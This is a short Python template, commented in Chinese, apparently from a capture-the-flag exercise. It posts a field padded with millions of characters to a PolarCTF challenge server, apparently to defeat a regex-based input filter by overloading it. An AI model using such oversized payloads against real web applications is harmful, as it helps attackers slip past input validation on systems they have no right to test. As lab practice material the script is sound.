import requests

data = {"xdmtql": "sys nb" + "aaaaa" * 1000000}  # 这里填写请求名和具体填充的数据,根据需要自行更改
res = requests.post('http://9ea3b20c-3246-49c8-8eeb-982616da49dd.www.polarctf.com:8090/', data=data,
                    allow_redirects=False)  # POST请求表达式，Socket换成自己的目标
# res = requests.get('http://9ea3b20c-3246-49c8-8eeb-982616da49dd.www.polarctf.com:8090/', data=data,
#                    allow_redirects=False) # 这里是GET的模板，需要的时候自行更改注释，最后的结果记得另存为，不要破坏模板
print(res.content)  # 以文本形式直接返回响应的内容
